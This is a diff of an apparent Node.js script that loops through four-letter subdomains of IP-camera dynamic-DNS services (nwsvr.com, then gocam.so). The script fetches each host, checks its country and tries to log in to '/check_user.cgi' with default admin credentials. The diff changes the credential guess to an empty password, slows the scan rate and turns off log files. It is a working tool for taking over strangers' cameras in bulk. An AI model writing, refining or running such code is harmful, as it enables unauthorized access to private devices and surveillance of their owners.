@@ -6,6 +6,7 @@ var satelize = require('satelize');
 var logger = new (winston.Logger)({
   transports: [
   	new (winston.transports.Console)(),
+    /*
     new (winston.transports.File)({
       name: 'info',
       filename: './log/device.info.log',
@@ -16,18 +17,20 @@ var logger = new (winston.Logger)({
       filename: './log/device.error.log',
       level: 'error'
     })
+    */
   ]
 });
 
 var url = '';
 
-for(a=118 ; a<119 ; a++) {
+
+for(a=98 ; a<100 ; a++) {
 	for(b=97 ; b<123 ; b++) {
 		for(c=97 ; c<123 ; c++) {
 			for(d=97 ; d<123 ; d++) {
-				url = 'http://002' + String.fromCharCode(a,b,c,d) + '.nwsvr.com';
+				url = 'http://' + String.fromCharCode(a,b,c,d) + '.gocam.so';
 				getLink(url);
-                sleep.usleep(500);
+                sleep.usleep(5000);
 			}
 		}
 	}
@@ -67,7 +70,7 @@ function checkCountry(url,link) {
 }
 
 function login(url,link) {
-	link = 'http://admin:123456@' + link.substr(7) + '/check_user.cgi';
+	link = 'http://admin@' + link.substr(7) + '/check_user.cgi';
 
     request({url: link}, function (error, response, body) {
     if (!error && response.statusCode == 200) {
